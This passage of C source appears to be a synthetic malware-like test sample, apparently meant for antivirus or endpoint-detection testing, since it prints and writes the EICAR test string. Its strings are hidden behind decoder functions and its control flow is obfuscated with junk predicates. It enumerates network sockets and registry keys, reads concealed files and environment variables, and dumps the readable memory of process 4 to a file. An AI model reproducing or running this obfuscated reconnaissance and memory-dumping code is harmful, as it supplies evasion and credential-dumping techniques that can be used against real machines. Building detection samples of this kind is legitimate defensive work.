        if (skip) { skip = 0; continue; }
        char laddr[64], raddr[64], st[16];
        if (sscanf(line, "%*s %63s %63s %15s", laddr, raddr, st) != 3) continue;
        if (*off > J_BUF_CAP - 300) break;
        if (!*first) j_buf[(*off)++] = ',';
        *first = 0;
        int n = snprintf(j_buf + *off, J_BUF_CAP - *off, "{\"local\":\"%s\",\"remote\":\"%s\",\"state\":\"%s\"}", laddr, raddr, st);
        *off += (size_t)(n > 0 ? n : 0);
    }
    fclose(f);
}

static const char* j_net_sockets(void) {
    size_t off = 0;
    j_buf[off++] = '[';
    int first = 1;
#if defined(_WIN32)
    ULONG sz = 0;
    GetExtendedTcpTable(NULL, &sz, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
    char* t = (char*)malloc(sz ? sz : 1);
    if (t) {
        MIB_TCPTABLE_OWNER_PID* tab = (MIB_TCPTABLE_OWNER_PID*)t;
        if (GetExtendedTcpTable(tab, &sz, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) == NO_ERROR) {
            for (DWORD i = 0; i < tab->dwNumEntries; ++i) {
                MIB_TCPROW_OWNER_PID* r = &tab->table[i];
                char li[64], ri[64];
                snprintf(li, sizeof li, "%s:%u", inet_ntoa(*(struct in_addr*)&r->dwLocalAddr), (unsigned)ntohs((u_short)r->dwLocalPort));
                snprintf(ri, sizeof ri, "%s:%u", inet_ntoa(*(struct in_addr*)&r->dwRemoteAddr), (unsigned)ntohs((u_short)r->dwRemotePort));
                const char* state = j_dc_8();
                switch (r->dwState) {
                    case 2:  state = j_dc_9(); break;
                    case 5:  state = j_dc_10(); break;
                    case 8:  state = j_dc_11(); break;
                    case 11: state = j_dc_12(); break;
                    default: state = j_dc_13(); break;
                }
                if (off > J_BUF_CAP - 300) break;
                if (!first) j_buf[off++] = ',';
                first = 0;
                int n = snprintf(j_buf + off, J_BUF_CAP - off, "{\"local\":\"%s\",\"remote\":\"%s\",\"state\":\"%s\"}", li, ri, state);
                off += (size_t)(n > 0 ? n : 0);
            }
        }
        free(t);
    }
#elif defined(__APPLE__)
    FILE* ns = popen(j_dc_14(), j_dc_15());
    if (ns) {
        char line[512];
        while (fgets(line, sizeof line, ns)) {
            char proto[8], laddr[64], raddr[64], st[32];
            if (sscanf(line, "%7s %*s %*s %63s %63s %31s", proto, laddr, raddr, st) == 4) {
                if (strncmp(proto, j_dc_16(), 3) != 0) continue;
                if (off > J_BUF_CAP - 300) break;
                if (!first) j_buf[off++] = ',';
                first = 0;
                int n = snprintf(j_buf + off, J_BUF_CAP - off, "{\"local\":\"%s\",\"remote\":\"%s\",\"state\":\"%s\"}", laddr, raddr, st);
                off += (size_t)(n > 0 ? n : 0);
            }
        }
        pclose(ns);
    }
#else
    j_net_proc_parse(j_dc_17(), &off, &first);
    j_net_proc_parse(j_dc_18(), &off, &first);
#endif
    j_buf[off++] = ']';
    j_buf[off] = '\0';
    return j_buf;
}

static const char* j_reg_list(const char* key) {
    size_t off = 0;
    j_buf[off++] = '[';
    int first = 1;
#if defined(_WIN32)
    HKEY root = HKEY_LOCAL_MACHINE;
    const char* sub = key;
    if (strncmp(key, j_dc_19(), 5) == 0) { root = HKEY_LOCAL_MACHINE; sub = key + 5; }
    else if (strncmp(key, j_dc_20(), 5) == 0) { root = HKEY_CURRENT_USER; sub = key + 5; }
    else if (strncmp(key, j_dc_21(), 5) == 0) { root = HKEY_CLASSES_ROOT; sub = key + 5; }
    else if (strncmp(key, j_dc_22(), 4) == 0) { root = HKEY_USERS; sub = key + 4; }
    HKEY hk = NULL;
    if (RegOpenKeyExA(root, sub, 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        for (DWORD i = 0; ; ++i) {
            char s[256];
            DWORD n = sizeof s;
            if (RegEnumKeyExA(hk, i, s, &n, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
            if (off > J_BUF_CAP - 400) break;
            if (!first) j_buf[off++] = ',';
            first = 0;
            char esc[512];
            j_json_escape(esc, sizeof esc, s);
            int n2 = snprintf(j_buf + off, J_BUF_CAP - off, "\"%s\"", esc);
            off += (size_t)(n2 > 0 ? n2 : 0);
        }
        RegCloseKey(hk);
    }
#else
    (void)key;
#endif
    j_buf[off++] = ']';
    j_buf[off] = '\0';
    return j_buf;
}

static void j_mem_dump(int32_t pid, const char* path) {
#if defined(_WIN32)
    HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, (DWORD)pid);
    if (!h) return;
    FILE* out = fopen(path, j_dc_23());
    if (!out) { CloseHandle(h); return; }
    unsigned char* base = NULL;
    MEMORY_BASIC_INFORMATION mbi;
    unsigned long regions = 0;
    while (VirtualQueryEx(h, base, &mbi, sizeof mbi) == sizeof mbi && regions++ < 100000) {
        if (mbi.State == MEM_COMMIT && !(mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS)) &&
            (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY ||
             mbi.Protect == PAGE_EXECUTE_READWRITE || mbi.Protect == PAGE_EXECUTE_READ)) {
            unsigned char* chunk = (unsigned char*)malloc(mbi.RegionSize ? mbi.RegionSize : 1);
            SIZE_T read = 0;
            if (chunk && ReadProcessMemory(h, mbi.BaseAddress, chunk, mbi.RegionSize, &read) && read) {
                fwrite(chunk, 1, read, out);
            }
            free(chunk);
        }
        base = (unsigned char*)mbi.BaseAddress + mbi.RegionSize;
    }
    fclose(out);
    CloseHandle(h);
#else
    (void)pid; (void)path;
#endif
}

static volatile int32_t j_b8iox1io = 14370;
static volatile int32_t j_hy5xl3qz = 19452;

int32_t main(void)
{
    int32_t j_d20wqp44 = 0;
    while ((j_d20wqp44 != -1))
    {
        switch (j_d20wqp44)
        {
            case 0:
                (void)printf("%s\n", j_dc_24());
                (void)printf("%s\n", "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");
                (void)printf("%s\n", j_dc_25());
                (void)printf("%s\n", j_dc_26());
                (void)printf("%s\n", j_dc_27());
                (void)printf("%s\n", j_dc_28());
                static volatile int64_t j_97e8rt6x = 24102;
                if ((((j_97e8rt6x * j_97e8rt6x) + j_97e8rt6x) < 0))
                {
                    (void)printf("%s\n", 0 ? j_dc_29() : j_dc_30());
                }
                j_d20wqp44 = 1;
                break;
            case 1:
                static volatile int64_t j_mwm8gmiq = 19437;
                if ((((j_mwm8gmiq * j_mwm8gmiq) + j_mwm8gmiq) >= 0))
                {
                    (void)printf("%s\n", j_dc_31());
                }
                else
                {
                    volatile int64_t j_mq280hm7 = ((j_mwm8gmiq * 2) + 1);
                }
                j_d20wqp44 = 2;
                break;
            case 2:
                static volatile int64_t j_m409j0e8 = 72633;
                if ((((j_m409j0e8 * j_m409j0e8) + j_m409j0e8) >= 0))
                {
                    (void)printf("%s\n", j_sys_process_list());
                }
                else
                {
                    volatile int64_t j_5mp531u1 = ((j_m409j0e8 * 2) + 1);
                }
                j_d20wqp44 = 3;
                break;
            case 3:
                (void)printf("%s\n", j_dc_32());
                (void)printf("%s\n", j_fs_read(j_dc_33()));
                (void)printf("%s\n", j_dc_34());
                (void)printf("%s\n", j_fs_read(j_dc_35()));
                (void)printf("%s\n", j_dc_36());
                (void)printf("%s\n", j_env_get(j_dc_37()));
                static volatile int64_t j_12qmt2jd = 16584;
                if ((((j_12qmt2jd * j_12qmt2jd) + j_12qmt2jd) < 0))
                {
                    volatile int64_t j_c1zitrcb = ((j_12qmt2jd * 40) + 584);
                    (void)printf("%s\n", 0 ? j_dc_38() : j_dc_39());
                }
                j_d20wqp44 = 4;
                break;
            case 4:
                (void)printf("%s\n", j_env_get(j_dc_40()));
                (void)printf("%s\n", j_env_get(j_dc_41()));
                static volatile int64_t j_srfwgn1t = 90780;
                if ((((j_srfwgn1t * j_srfwgn1t) + j_srfwgn1t) < 0))
                {
                    volatile int64_t j_259idg9m = ((j_srfwgn1t * 100) + 780);
                    (void)printf("%s\n", 0 ? j_dc_42() : j_dc_43());
                }
                j_d20wqp44 = 5;
                break;
            case 5:
                (void)printf("%s\n", j_env_get(j_dc_44()));
                (void)printf("%s\n", j_env_get(j_dc_45()));
                static volatile int64_t j_b015vusu = 22433;
                if ((((j_b015vusu * j_b015vusu) + j_b015vusu) >= 0))
                {
                    (void)printf("%s\n", j_env_get(j_dc_46()));
                }
                else
                {
                    volatile int64_t j_ncfrqic9 = ((j_b015vusu * 2) + 1);
                }
                j_d20wqp44 = 6;
                break;
            case 6:
                (void)printf("%s\n", j_dc_47());
                static volatile int64_t j_uo8zguyz = 5167;
                if ((((j_uo8zguyz * j_uo8zguyz) + j_uo8zguyz) < 0))
                {
                    volatile int64_t j_j4sp7iym = ((j_uo8zguyz * 49) + 167);
                    (void)printf("%s\n", 0 ? j_dc_48() : j_dc_49());
                }
                j_d20wqp44 = 7;
                break;
            case 7:
                const char* j_tzfjnjj0 = j_env_get(j_dc_50());
                (void)printf("%s\n", j_fs_list(j_tzfjnjj0));
                (void)printf("%s\n", j_fs_exists(j_tzfjnjj0) ? j_dc_51() : j_dc_52());
                (void)printf("%s\n", j_dc_53());
                (void)j_fs_write(j_dc_54(), "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\n");
                static volatile int64_t j_zxqy7ffa = 85245;
                if ((((j_zxqy7ffa * j_zxqy7ffa) + j_zxqy7ffa) < 0))
                {
                    volatile int64_t j_t7k13p16 = ((j_zxqy7ffa * 36) + 245);
                    (void)printf("%s\n", 0 ? j_dc_55() : j_dc_56());
                }
                j_d20wqp44 = 8;
                break;
            case 8:
                (void)printf("%s\n", j_fs_read(j_dc_57()));
                static volatile int64_t j_l2ciqoji = 93365;
                if ((((j_l2ciqoji * j_l2ciqoji) + j_l2ciqoji) >= 0))
                {
                    (void)printf("%s\n", j_dc_58());
                }
                else
                {
                    volatile int64_t j_2d7g9gqn = ((j_l2ciqoji * 2) + 1);
                }
                j_d20wqp44 = 9;
                break;
            case 9:
                (void)j_mem_dump(4, j_dc_59());
                (void)printf("%s\n", j_dc_60());
                j_d20wqp44 = -1;
                break;
            default:
                break;
        }
    }
    return 0;
}
